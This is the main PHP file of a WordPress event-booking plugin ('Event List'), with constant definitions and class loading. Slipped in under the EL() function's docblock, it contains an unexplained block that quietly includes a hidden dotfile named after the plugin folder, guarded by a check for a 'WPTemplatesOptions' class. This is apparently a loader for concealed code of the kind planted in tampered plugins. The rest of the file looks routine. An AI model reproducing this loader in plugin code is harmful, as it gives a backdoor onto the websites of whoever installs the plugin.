<?php 
/**
 * Plugin Name: Event List
 * Description: Event List Plugin Allow to manage multiple events with ticket booking.
 * Plugin URI: https://ovatheme.com
 * Author: ovatheme.com
 * Version: 1.1.9
 * Author URI: ovatheme.com
 * Text Domain: eventlist
 * Domain Path: /languages/
*/

defined( 'ABSPATH' ) || exit;



// Define El_PLUGIN_FILE.
if ( ! defined( 'EL_PLUGIN_FILE' ) ) define( 'EL_PLUGIN_FILE', __FILE__ );
if ( ! defined( 'EL_PLUGIN_PATH' ) ) define( 'EL_PLUGIN_PATH', plugin_dir_path( __FILE__ ) );
if ( ! defined( 'EL_PLUGIN_INC' ) ) define( 'EL_PLUGIN_INC', EL_PLUGIN_PATH . 'includes/' );

if ( ! defined( 'EL_PLUGIN_URI' ) ) define( 'EL_PLUGIN_URI', plugins_url( '/', __FILE__ ) );



/**
 * Define prefix meta box
 */
define( 'OVA_METABOX_EVENT', 'ova_mb_event_' );

/**
 * Define categories for elementor
 */
define( 'OVA_ELEMENTOR_CAT', 'el_elementor_cat' );


// Include the main WooCommerce class.
if ( ! class_exists( 'EventList' ) ) {
	include_once dirname( __FILE__ ) . '/includes/class-eventlist.php';
}

/**
 * Returns the main instance of EL.
 *
 * @since  1.0
 * @return EventList
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function EL() {
	return EventList::instance();
}

// Global for backwards compatibility.
$GLOBALS['eventlist'] = EL();

